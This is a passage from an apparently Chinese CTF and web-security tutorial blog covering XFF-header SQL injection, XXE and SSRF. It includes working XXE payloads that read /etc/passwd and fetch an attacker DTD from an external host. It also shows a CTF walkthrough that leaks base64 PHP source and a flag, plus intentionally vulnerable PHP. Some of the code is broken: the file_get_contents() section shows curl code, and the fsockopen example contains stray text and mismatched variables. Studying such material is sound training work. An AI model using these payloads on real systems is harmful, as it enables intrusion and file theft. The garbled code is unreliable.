<h5 id="2-XFF导致sql注入"><a href="#2-XFF导致sql注入" class="headerlink" title="2.XFF导致sql注入"></a>2.XFF导致sql注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-for: 127.0.0.1&#39; and 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>​        发现没有报错，证明存在注入点,然后进一步利用sql注入，进行渗透测试。</p>
<h5 id="3-其他服务器真实地址的参数"><a href="#3-其他服务器真实地址的参数" class="headerlink" title="3.其他服务器真实地址的参数"></a>3.其他服务器真实地址的参数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x-forwarded-fot</span><br><span class="line">x-remote-IP</span><br><span class="line">x-originating-IP</span><br><span class="line">x-remote-ip</span><br><span class="line">x-remote-addr</span><br><span class="line">x-client-IP</span><br><span class="line">x-client-ip</span><br><span class="line">x-Real-ip</span><br></pre></td></tr></table></figure>

<h5 id="4-例题"><a href="#4-例题" class="headerlink" title="4.例题"></a>4.例题</h5><p><a target="_blank" rel="noopener" href="http://47.98.234.232:28017/">http://47.98.234.232:28017/</a></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201120104642871.png"></p>
<p>用Burp Suite抓包 将use=0改为use=1;写入X-Forwarded-For对http进行绕过，得到flag</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201120105133282.png"></p>
<h2 id="XXF-XML-External-Entity-injection-XML-外部实体注入漏洞）"><a href="#XXF-XML-External-Entity-injection-XML-外部实体注入漏洞）" class="headerlink" title="XXF((XML External Entity injection)XML 外部实体注入漏洞）"></a>XXF((XML External Entity injection)XML 外部实体注入漏洞）</h2><h3 id="•什么是XXF漏洞"><a href="#•什么是XXF漏洞" class="headerlink" title="•什么是XXF漏洞"></a>•什么是XXF漏洞</h3><p>​        *如果XML 文件在引用外部实体时候，可以沟通构造恶意内容，可以导致读取任意文件，命令执行和对内网的攻击，这就是XXE漏洞</p>
<h3 id="•XML"><a href="#•XML" class="headerlink" title="•XML"></a>•XML</h3><h5 id="1-XML概念："><a href="#1-XML概念：" class="headerlink" title="1.XML概念："></a>1.<strong>XML概念：</strong></h5><p>​         XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储， 结构是树形结构，有标签构成，这点很想HTML语言。但是XML和HTML有明显区别如下：<br>XML 被设计用来传输和存储数据。<br>HTML 被设计用来显示数据。</p>
<h5 id="2-XML结构"><a href="#2-XML结构" class="headerlink" title="2.XML结构:"></a>2.XML结构:</h5><p>​        来看一个简单的XML 文件结构， 第一行XML的声明，第二行<note> 为根元素， 下面的to, from,heading和body 都是子元素，构成了一个出色的自我描述性的结构：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;Don&#39;t forget me this weekend!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>

<h5 id="3-XML-DTD-（重点）"><a href="#3-XML-DTD-（重点）" class="headerlink" title="3.XML DTD （重点）"></a>3.XML DTD （重点）</h5><p>​         DTD全称为，Document Type Definition，中文翻译为文档类型定义，是一套为了进行程序间的数据交换而建立的关于标记符的语法规则。<br>​        文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 有两种声明的方法，一种是内部声明，一种是外部声明，我们下面开具体看一下：<br><strong>DTD的外部声明：</strong><br>外部需要一个DTD的文件，比如：note.dtc</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;Don&#39;t forget me this weekend!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>

<p><strong>DTD 的内部声明:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM &quot;filename&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"> &lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;Don&#39;t forget me this weekend!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>

<h3 id="•XXE漏洞成因"><a href="#•XXE漏洞成因" class="headerlink" title="•XXE漏洞成因"></a><strong>•XXE漏洞成因</strong></h3><p>​        XML数据在传输中数据被修改，服务器执行被恶意插入的代码，最终实现攻击的目的，XXE漏洞就是在XML在外部声明的时候出现了问题。看一下修改后的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; # 直接读取系统的文件</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;name&gt;&amp;content;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>

<h5 id="怎样构建外部实体注入："><a href="#怎样构建外部实体注入：" class="headerlink" title="怎样构建外部实体注入："></a><strong>怎样构建外部实体注入：</strong></h5><p><strong>（1）直接通过DTD外部实体声明</strong></p>
<p>XML内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY content SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br></pre></td></tr></table></figure>

<p><strong>（2）通过DTD文档引入外部DTD文档，再引入外部实体声明</strong></p>
<p>XML内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a SYSTEM &quot;http:&#x2F;&#x2F;mark4z5.com&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br></pre></td></tr></table></figure>

<p>DTD文件内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; </span><br></pre></td></tr></table></figure>

<p><strong>（3）通过DTD外部实体声明引入外部实体声明</strong></p>
<p>XML内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">   &lt;!ENTITY % d SYSTEM &quot;http:&#x2F;&#x2F;mark4z5.com&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">   %d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br></pre></td></tr></table></figure>

<p>DTD文件内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt; </span><br></pre></td></tr></table></figure>

<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>134.175.168.213:28100</p>
<p>查看页面源码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201120135131233.png"></p>
<p>发现存在index.php文件</p>
<p>使用php伪协议读取index.php </p>
<p>使用Burp Suite进行抓包</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201120142653285.png"></p>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCmxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIoZmFsc2UpOw0KJGRhdGEgPSBAZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7DQokcmVzcCA9ICcnOw0KLy8kZmxhZz0nZmxhZ3s3OWQxMDYyNi1kMjdmLTQ1NjktYTYyOS1jOTYwNmQwMzc4ZjJ9JzsNCmlmKCRkYXRhICE9IGZhbHNlKXsNCiAgICAkZG9tID0gbmV3IERPTURvY3VtZW50KCk7DQogICAgJGRvbS0+bG9hZFhNTCgkZGF0YSwgTElCWE1MX05PRU5UKTsNCiAgICBvYl9zdGFydCgpOw0KICAgICRyZXMgID0gJGRvbS0+dGV4dENvbnRlbnQ7DQogICAgJHJlc3AgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICBpZiAoJHJlcyl7DQogICAgICAgIGRpZSgkcmVzKTsNCiAgICB9DQoNCn0NCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8dGl0bGU+d2VsY29tZTwvdGl0bGU+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iaWU9ZWRnZSI+DQoNCjwvaGVhZD4NCjxib2R5IGNsYXNzPSJjb250YWN0Qm9keSI+DQo8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4NCiAgICA8ZGl2IGNsYXNzPSJ0aXRsZSI+DQoNCg0KICAgIDwvZGl2Pg0KDQoNCiAgICA8Zm9ybSBtZXRob2Q9InBvc3QiIGNsYXNzPSJmb3JtIj4NCiAgICAgICAgPGgxIGlkPSJ0aXRsZSI+6K+36L6T5YWl5aeT5ZCNPC9oMT4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJuYW1lIGVudHJ5ICIgaWQ9Im5hbWUiIG5hbWU9Im5hbWUiIHBsYWNlaG9sZGVyPSJZb3VyIE5hbWUiLz4NCiAgICA8L2Zvcm0+DQogICAgPGJ1dHRvbiBjbGFzcz0ic3VibWl0IGVudHJ5IiBvbmNsaWNrPSJmdW5jKCkiPlN1Ym1pdDwvYnV0dG9uPg0KDQogICAgPGRpdiBjbGFzcz0ic2hhZG93Ij48L2Rpdj4NCjwvZGl2Pg0KDQo8L2JvZHk+DQo8L2h0bWw+DQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQogICAgZnVuY3Rpb24gcGxheSgpIHsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBmdW5jdGlvbiBmdW5jKCkgew0KICAgICAgICAvLyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgpLnZhbHVlDQogICAgICAgIHZhciB4bWwgPSAnJyArDQogICAgICAgICAgICAnPFw&#x2F;eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ilw&#x2F;PicgKw0KICAgICAgICAgICAgJzxmZWVkYmFjaz4nICsNCiAgICAgICAgICAgICc8YXV0aG9yPicgKyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmFtZScpLnZhbHVlKyAnPC9hdXRob3I+JyArDQogICAgICAgICAgICAnPC9mZWVkYmFjaz4nOw0KICAgICAgICBjb25zb2xlLmxvZyh4bWwpOw0KICAgICAgICB2YXIgeG1saHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICB4bWxodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHsNCiAgICAgICAgICAgIGlmICh4bWxodHRwLnJlYWR5U3RhdGUgPT0gNCkgew0KICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUubG9nKHhtbGh0dHAucmVhZHlTdGF0ZSk7DQogICAgICAgICAgICAgICAgLy8gY29uc29sZS5sb2coeG1saHR0cC5yZXNwb25zZVRleHQpOw0KICAgICAgICAgICAgICAgIHZhciByZXMgPSB4bWxodHRwLnJlc3BvbnNlVGV4dDsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGl0bGUnKS50ZXh0Q29udGVudCA9IHJlcw0KICAgICAgICAgICAgfQ0KICAgICAgICB9Ow0KICAgICAgICB4bWxodHRwLm9wZW4oIlBPU1QiLCAiaW5kZXgucGhwIiwgdHJ1ZSk7DQogICAgICAgIHhtbGh0dHAuc2VuZCh4bWwpOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfTsNCjwvc2NyaXB0Pg0KPC9ib2R5Pg0KPC9odG1sPg&#x3D;&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对获取的字符串进行base64解码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$data &#x3D; @file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">$resp &#x3D; &#39;&#39;;</span><br><span class="line">&#x2F;&#x2F;$flag&#x3D;&#39;flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;&#39;;</span><br><span class="line">if($data !&#x3D; false)&#123;</span><br><span class="line">    $dom &#x3D; new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  &#x3D; $dom-&gt;textContent;</span><br><span class="line">    $resp &#x3D; ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    if ($res)&#123;</span><br><span class="line">        die($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;.&#x2F;style.css&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body class&#x3D;&quot;contactBody&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;wrapper&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;title&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method&#x3D;&quot;post&quot; class&#x3D;&quot;form&quot;&gt;</span><br><span class="line">        &lt;h1 id&#x3D;&quot;title&quot;&gt;请输入姓名&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;br&#x2F;&gt;</span><br><span class="line">        &lt;br&#x2F;&gt;</span><br><span class="line">        &lt;br&#x2F;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;name entry &quot; id&#x3D;&quot;name&quot; name&#x3D;&quot;name&quot; placeholder&#x3D;&quot;Your Name&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;button class&#x3D;&quot;submit entry&quot; onclick&#x3D;&quot;func()&quot;&gt;Submit&lt;&#x2F;button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class&#x3D;&quot;shadow&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    function play() &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    function func() &#123;</span><br><span class="line">        &#x2F;&#x2F; document.getElementById().value</span><br><span class="line">        var xml &#x3D; &#39;&#39; +</span><br><span class="line">            &#39;&lt;\?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;\?&gt;&#39; +</span><br><span class="line">            &#39;&lt;feedback&gt;&#39; +</span><br><span class="line">            &#39;&lt;author&gt;&#39; + document.getElementById(&#39;name&#39;).value+ &#39;&lt;&#x2F;author&gt;&#39; +</span><br><span class="line">            &#39;&lt;&#x2F;feedback&gt;&#39;;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        var xmlhttp &#x3D; new XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange &#x3D; function () &#123;</span><br><span class="line">            if (xmlhttp.readyState &#x3D;&#x3D; 4) &#123;</span><br><span class="line">                &#x2F;&#x2F; console.log(xmlhttp.readyState);</span><br><span class="line">                &#x2F;&#x2F; console.log(xmlhttp.responseText);</span><br><span class="line">                var res &#x3D; xmlhttp.responseText;</span><br><span class="line">                document.getElementById(&#39;title&#39;).textContent &#x3D; res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(&quot;POST&quot;, &quot;index.php&quot;, true);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>得到源代码和flag.</p>
<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h3 id="•什么是SSRF漏洞"><a href="#•什么是SSRF漏洞" class="headerlink" title="•什么是SSRF漏洞"></a>•什么是SSRF漏洞</h3><p>​        ssrf(Sever-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造攻击链传给服务器，服务端执行并发起请求造成安全问题的漏洞，一般用来在外网探测或攻击内网服务。</p>
<h3 id="•怎么寻找存在SSRF漏洞"><a href="#•怎么寻找存在SSRF漏洞" class="headerlink" title="•怎么寻找存在SSRF漏洞"></a>•怎么寻找存在SSRF漏洞</h3><ul>
<li>分享：通过URL分享网页内容</li>
<li>转码服务：通过url地址把原地址的网页内容调优使得适合手机屏幕浏览</li>
<li>在线翻译：通过url地址翻译对应的文本内容，例如 百度 有道</li>
<li>图片加载与下载  通过url地址加载或者下载图片</li>
<li>图片、文章的收藏功能</li>
<li>未公开的api实现以及其他调用url的功能</li>
<li>从url关键字中寻找：share、wap、url、link、src、source、target、u、3g、dispaly、sourceURI、ImageURL、domain……</li>
</ul>
<h3 id="•产生SSRF的PHP函数"><a href="#•产生SSRF的PHP函数" class="headerlink" title="•产生SSRF的PHP函数"></a>•产生SSRF的PHP函数</h3><ul>
<li>file_get_contents()</li>
<li>fsockopen()</li>
<li>curl_exec()</li>
</ul>
<h5 id="1-file-get-contents-函数造成的ssrf"><a href="#1-file-get-contents-函数造成的ssrf" class="headerlink" title="1.file_get_contents()函数造成的ssrf"></a>1.<strong>file_get_contents()函数造成的ssrf</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">function curl($url)&#123;</span><br><span class="line">	$ch &#x3D; curl_init();&#x2F;&#x2F;初始化一个新的curl会话，返回一个curl句柄</span><br><span class="line">	curl_setopt($ch, CURLOPT_URL,$url);&#x2F;&#x2F;设置一个curl传输选项，需要获取的url地址</span><br><span class="line">	curl_setopt($ch, CURLOPT_HEADER,0);&#x2F;&#x2F;启动时候将头文件的信息作为数据流输出</span><br><span class="line">	curl_exec($ch);&#x2F;&#x2F;执行一个curl会话</span><br><span class="line">	curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">curl($url);</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>  file_get_contents：文件写入字符串，当url是内网文件的时候，会先去把这个文件的内容读出来再写入，导致了文件读取。</p>
<h5 id="2-fsockopen-函数造成的ssrf"><a href="#2-fsockopen-函数造成的ssrf" class="headerlink" title="2.fsockopen()函数造成的ssrf"></a>2.<strong>fsockopen()函数造成的ssrf</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">function getfile($host,$port,$link)&#123;</span><br><span class="line">	$fp &#x3D; fsockopen($host,intval($port),$errno,$errstr,30);&#x2F;&#x2F;打开一个网络连接或者一个unix套接字连接</span><br><span class="line">	if(!$fp)&#123;</span><br><span class="line">		echo &quot;$errstr (error number $errno) \n&quot;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line"> </span><br><span class="line">		$out &#x3D; &quot;GET $link HTTP&#x2F;1.1\r\n&quot;;</span><br><span class="line">		$out.&#x3D;&quot;HOST $host \r\n&quot;;</span><br><span class="line">		$out.&#x3D;&quot;Connection:Close\r\n\r\n&quot;;</span><br><span class="line">		$out.&#x3D;&quot;\r\n&quot;;</span><br><span class="line">		fwrite($fp, $out);</span><br><span class="line">		$content &#x3D; &#39;&#39;;</span><br><span class="line">		while (!feof($fp)) &#123; &#x2F;&#x2F;检查是否已经达到文件末尾</span><br><span class="line">			$contents .&#x3D; fgets($fp,1024);</span><br><span class="line">			# code...</span><br><span class="line">		&#125;</span><br><span class="line">		fclose($fp)mianshiti </span><br><span class="line">		return $contents;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">echo(getfile(&quot;127.0.0.1&quot;,&quot;80&quot;,&quot;index.php&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="3-curl-exec-函数造成的ssrf漏洞"><a href="#3-curl-exec-函数造成的ssrf漏洞" class="headerlink" title="3.curl_exec()函数造成的ssrf漏洞"></a>3.<strong>curl_exec()函数造成的ssrf漏洞</strong></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">function curl($url)&#123;</span><br><span class="line">	$ch &#x3D; curl_init();&#x2F;&#x2F;初始化一个新的curl会话，返回一个curl句柄</span><br><span class="line">	curl_setopt($ch, CURLOPT_URL,$url);&#x2F;&#x2F;设置一个curl传输选项，需要获取的url地址</span><br><span class="line">	curl_setopt($ch, CURLOPT_HEADER,0);&#x2F;&#x2F;启动时候将头文件的信息作为数据流输出</span><br><span class="line">	curl_exec($ch);&#x2F;&#x2F;执行一个curl会话</span><br><span class="line">	curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">curl($url);</span><br><span class="line"> </span><br><span 